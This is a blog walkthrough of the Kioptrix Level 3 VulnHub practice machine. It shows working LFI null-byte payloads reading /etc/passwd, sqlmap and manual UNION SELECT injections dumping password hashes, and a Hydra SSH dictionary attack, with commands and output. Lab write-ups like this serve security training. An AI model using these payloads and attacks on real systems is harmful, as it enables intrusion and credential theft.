---
layout: post
title:  "Kioptrix Level 3 Walkthrough"
date:   2019-04-14 21:28:02 +0530
categories: [vulnhub, vulnerable-machine]
---
Kioptrix level 3 vulnhub link below: <br>
[Kioptrix Level 3 download page]
<br><br>
<h2>1. Enumeration</h2>
A port scan reveals that only SSH and HTTP is open.
{% highlight shell_session %}
nmap -T4 -sV -A -oA nmapscan 192.168.0.71
Nmap scan report for UNKNOWN (192.168.0.71)
Host is up (0.0051s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags:
|
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
{% endhighlight %}
<br>


<h3>1.1 SSH</h3>
SSH appears to not have any vulnerable versions. However, SSH could possibly have weak credentials.
<br><br>


<h3>1.2.1 HTTP</h3>
Dirb and Nikto is run in the background to check for any interesting pages or vulnerabilities. Dirb reveals
that there is an accessible <font color="red">phpmyadmin</font> page. The page can be logged in
using the username <font color="red">root</font> and the
password can be a random string. However, this did not really reveal anything and the default login has no privileges.
<br><br>
The login page reveals that it is powered by <font color="red">lotus</font>.
<br><br><br>
![Kioptrix level 3 lotus login](/assets/images/Kioptrix/Kioptrix3-lotus-login.png)
<br><br>
Using searchsploit, a vulnerability is found:
<br>
![Kioptrix level 2 lotus vuln](/assets/images/Kioptrix/Kioptrix3-lotus-cms-vuln.png)
<br><br>
This vulnerability is for remote command execution with metasploit. This can be used
to get a meterpreter shell on the target. Finding this exploit was too easy. However there are several
vulnerabilities on this machine.
<br><br>


<h3>1.2.2 HTTP - LFI</h3>
The URL appears to include files, this could possibly be vulnerable to LFI.
<br><br>
`http://192.168.0.71/index.php?system=Blog`
<br><br>
Using the following after system <font color="red">../../../../../etc/passwd</font> reveals nothing. However, with some research.
The OWSAP 'Testing for LFI page' reveals that when using PHP, a null byte terminator at the end of the file will
bypass it. When using the following:
<br><br>
`http://vulnerable_host/preview.php?file=../../../../etc/passwd%00jpg`
<br>
{% highlight shell_session %}
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
...............
...............
mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
loneferret:x:1000:100:loneferret,,,:/home/loneferret:/bin/bash
dreg:x:1001:1001:Dreg Gevans,0,555-5566,:/home/dreg:/bin/rbash
{% endhighlight %}
This shows the passwd contents which can used for brute forcing SSH. <font color="red">loneferret</font> and <font color="red">dreg</font> can be used to perform a
dictionary attack against them over SSH.
<br><br>
More info from OWASP here: [OWASP LFI testing]
<br><br>


<h3>1.2.3 HTTP - sqlmap (Easy SQL Injection)</h3>
<br>
When browsing the website, the gallery page has a button to filter by an ID. This appears to
be a form of retrieving data from the SQL database. Using the <font color="red">'</font> at the end of the ID, an SQL
error appears which is good news. The website is vulnerable to SQL. SQLmap is then used to check for the
databases:
<br><br>
`sqlmap -u http://192.168.0.71/gallery/gallery.php\?id\=">http://192.168.0.71/gallery/gallery.php\?id\= --dbs`
<br><br>
available databases [3]:<br>
<font color="red">gallery</font>---
<font color="red">information_schema</font>---
<font color="red">mysql</font>---
<br>
Three databases were revealed above. The gallery database could be the contents of
the images and users of the gallery. The database <font color="red">gallery</font> can searched next.
<br><br>
<font color="red">sqlmap -u http://192.168.0.71/gallery/gallery.php\?id\=">http://192.168.0.71/gallery/gallery.php\?id\= -D gallery --'tables'</font>

{% highlight shell_session %}
Database: gallery
[7 tables]
+----------------------+
| `dev_accounts`       |
| gallarific_comments  |
| gallarific_galleries |
| gallarific_photos    |
| gallarific_settings  |
| gallarific_stats     |
| gallarific_users     |
+----------------------+
{% endhighlight %}
<br>
A table of <font color="red">dev_accounts</font> is worth investigating, this could contain <font color="red">dev</font> accounts.. duh.
<br><br>
<font color="red">sqlmap -u http://192.168.0.71/gallery/gallery.php\?id\=http://192.168.0.71/gallery/gallery.php\?id\= -D gallery -T dev_accounts --dump</font>

{% highlight shell_session %}
Database: gallery
Table: dev_accounts
[2 entries]
+----+------------+---------------------------------------------+
| id | username   | password                                    |
+----+------------+---------------------------------------------+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
+----+------------+---------------------------------------------+
{% endhighlight %}
<br>
The <font color="red">dev_accounts</font> results contain 2 usernames and 2 hashes which were easily
crackable with sqlmap.
<br><br>
<h3>1.2.4 HTTP - SQLI (without sqlmap)</h3>

Checking for the amount of columns by using <font color="red">ORDER BY</font>.<br>
<font color="red">id=2 union select 1,2,3,4,5,6</font>
<br><br>
Finding the database and tables using <font color="red">UNION SELECT</font>. This results in the database <font color="red">gallery</font> being shown. <br>
<font color="red">id=2 UNION SELECT 1, table_schema, table_name,4,5,6 FROM information_schema.tables--</font>
<br><br>
Searching inside the database gallery:<br>
<font color="red">id=1 UNION SELECT 1, table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema = 'gallery'#</font>
<br><br>
The gallery table shows the dev_accouns table. The dev_accounts can then be searched for the columns.<br>
<font color="red">id=1 UNION SELECT 1, column_name,3,4,5,6 FROM information_schema.columns WHERE table_name = 'dev_accounts'#</font>
<br><br>
The columns reveal the 2 user accounts and there corresponding hashes. The hashes can then be cracked with
john the ripper.
<br><br>

<h2>2.1 Exploitation - SSH</h2>

The credentials fetched from the LFI attack can be run against a dictionary.<br>
{% highlight shell_session %}
hydra -t 6 -l loneferret -P 10k-most-common.txt 192.168.0.71 ssh
Hydra v8.9.1 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking ssh://192.168.0.71:22/
[STATUS] 52.00 tries/min, 52 tries in 00:01h, 9948 to do in 03:12h, 4 active
[22][ssh] host: 192.168.0.71   login: loneferret   password: starwars
1 of 1 target successfully completed, 1 valid password found
{% endhighlight %}
<br>
The dictionary attack with Hydra above was successful and the password was revealed as <font color="red">starwars</font>. When attempting to login
to SSH with this username and password it is successful. When browsing files i found a configuration file in the gallery
directory which contains the mysql login which is <font color="red">root</font> and the password is <font color="red">fuckeyou</font>. This gives us full root access to
the database.
<h3>Pwned!</h3>

[Kioptrix Level 3 download page]: https://www.vulnhub.com/entry/kioptrix-level-12-3,24/
[OWASP LFI testing]: https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
